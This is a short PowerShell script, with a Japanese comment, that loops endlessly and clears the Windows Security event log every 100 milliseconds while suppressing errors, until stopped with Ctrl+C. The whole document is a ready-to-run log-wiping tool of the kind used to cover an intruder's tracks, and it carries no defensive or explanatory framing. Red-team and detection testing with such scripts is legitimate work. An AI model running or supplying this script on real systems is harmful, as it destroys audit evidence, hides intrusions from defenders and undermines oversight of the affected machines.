Write-Host "[*] Started deleting WinEventLog..."
Write-Host "[*] Target: Security Event Log"
Write-Host "[*] Press Ctrl + C to stop."

try {
    while($true) {
        # エラー無視で0.1秒ごとにSecurityログを削除
        Clear-EventLog -LogName Security -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 100
    }
} catch {
    Write-Host "`n[!] Deleting stopped."
}